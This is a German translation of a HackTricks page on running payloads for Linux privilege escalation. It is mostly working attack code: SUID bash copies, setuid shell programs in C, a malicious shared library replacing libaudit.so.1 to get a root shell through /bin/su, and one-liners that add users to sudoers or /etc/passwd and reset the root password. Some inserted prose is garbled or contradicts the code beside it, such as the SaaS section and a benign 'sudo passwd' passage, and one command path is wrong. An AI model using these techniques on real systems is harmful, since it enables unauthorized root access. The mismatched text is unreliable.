# Ausführung von Payloads

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>

## Bash
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## Ausführung von Payloads

Es gibt verschiedene Möglichkeiten, Payloads auf einem Linux-System auszuführen, um eine Privilegieneskalation zu erreichen. Hier sind einige gängige Methoden:

### 1. SUID-Binärdateien missbrauchen

SUID (Set User ID) ist ein Berechtigungsbit, das auf ausführbare Dateien angewendet werden kann. Wenn eine Datei mit dem SUID-Bit versehen ist, wird sie mit den Berechtigungen des Eigentümers ausgeführt, anstatt mit den Berechtigungen des ausführenden Benutzers. Dies kann ausgenutzt werden, um eine Datei mit höheren Berechtigungen auszuführen.

Um eine SUID-Binärdatei zu finden, können Sie den folgenden Befehl verwenden:

```bash
find / -perm -4000 2>/dev/null
```

### 2. Cron-Jobs manipulieren

Cron-Jobs sind geplante Aufgaben, die automatisch zu bestimmten Zeiten ausgeführt werden. Wenn ein Cron-Job mit höheren Berechtigungen ausgeführt wird, kann er manipuliert werden, um einen Payload auszuführen.

Um Cron-Jobs zu überprüfen, können Sie den folgenden Befehl verwenden:

```bash
ls -la /etc/cron*
```

### 3. Umgebungsvariablen manipulieren

Umgebungsvariablen sind Werte, die von Prozessen verwendet werden, um Informationen zu speichern. Wenn eine Umgebungsvariable von einem Prozess verwendet wird, der mit höheren Berechtigungen ausgeführt wird, kann sie manipuliert werden, um einen Payload auszuführen.

Um die Umgebungsvariablen eines Prozesses anzuzeigen, können Sie den folgenden Befehl verwenden:

```bash
cat /proc/<PID>/environ
```

### 4. Kernel-Exploits verwenden

Ein Kernel-Exploit ist eine Schwachstelle im Betriebssystemkern, die ausgenutzt werden kann, um höhere Berechtigungen zu erlangen. Es gibt verschiedene Kernel-Exploits, die je nach Linux-Distribution und Kernel-Version variieren.

Um nach Kernel-Exploits zu suchen, können Sie den folgenden Befehl verwenden:

```bash
searchsploit linux kernel <version>
```

### 5. Schwachstellen in SaaS-Plattformen ausnutzen

Wenn Sie Zugriff auf eine SaaS-Plattform haben, können Sie nach Schwachstellen suchen, die es Ihnen ermöglichen, höhere Berechtigungen zu erlangen. Dies kann durch Ausnutzen von Sicherheitslücken in der Plattform selbst oder in den gehosteten Anwendungen erreicht werden.

Um nach Schwachstellen in einer SaaS-Plattform zu suchen, können Sie den folgenden Befehl verwenden:

```bash
searchsploit <platform>
```

Diese Methoden sind nur einige Beispiele für die Ausführung von Payloads zur Privilegieneskalation auf einem Linux-System. Es gibt viele weitere Techniken und Tools, die verwendet werden können, um höhere Berechtigungen zu erlangen. Es ist wichtig, diese Techniken zu verstehen und zu lernen, um effektive Sicherheitsmaßnahmen ergreifen zu können.
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Überschreiben einer Datei zur Eskalation von Privilegien

### Häufig verwendete Dateien

* Benutzer mit Passwort zu _/etc/passwd_ hinzufügen
* Passwort in _/etc/shadow_ ändern
* Benutzer zu sudoers in _/etc/sudoers_ hinzufügen
* Docker über den Docker-Socket missbrauchen, normalerweise in _/run/docker.sock_ oder _/var/run/docker.sock_

### Überschreiben einer Bibliothek

Überprüfen Sie eine von einem bestimmten Binärprogramm verwendete Bibliothek, in diesem Fall `/bin/su`:
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
In diesem Fall versuchen wir, `/lib/x86_64-linux-gnu/libaudit.so.1` zu imitieren.\
Überprüfen Sie daher die Funktionen dieser Bibliothek, die vom **`su`**-Binärprogramm verwendet werden:
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
Die Symbole `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` und `audit_fd` stammen wahrscheinlich aus der Bibliothek libaudit.so.1. Da die libaudit.so.1 durch die bösartige Shared Library überschrieben wird, sollten diese Symbole in der neuen Shared Library vorhanden sein. Andernfalls kann das Programm das Symbol nicht finden und wird beendet.
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Nun, indem Sie einfach **`/bin/su`** aufrufen, erhalten Sie eine Shell als Root.

## Skripte

Können Sie root dazu bringen, etwas auszuführen?

### **www-data zu sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Root-Passwort ändern**

Um das Root-Passwort zu ändern, können Sie den folgenden Befehl verwenden:

```bash
sudo passwd root
```

Sie werden aufgefordert, das aktuelle Root-Passwort einzugeben und dann das neue Passwort zweimal einzugeben, um es zu bestätigen. Stellen Sie sicher, dass Sie ein sicheres Passwort wählen, das aus einer Kombination von Groß- und Kleinbuchstaben, Zahlen und Sonderzeichen besteht.

Nachdem das Root-Passwort erfolgreich geändert wurde, können Sie sich mit dem neuen Passwort als Root-Benutzer anmelden.
```bash
echo "root:hacked" | chpasswd
```
### Neuen Root-Benutzer zu /etc/passwd hinzufügen

Um einen neuen Root-Benutzer zur Datei /etc/passwd hinzuzufügen, können Sie den folgenden Befehl verwenden:

```bash
echo 'newroot:x:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Dieser Befehl fügt einen neuen Eintrag für den Benutzer "newroot" hinzu, der die Root-Rechte hat. Der Benutzer wird dem Verzeichnis /root zugeordnet und verwendet die Shell /bin/bash.
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family).
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com).
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud) senden**.

</details>
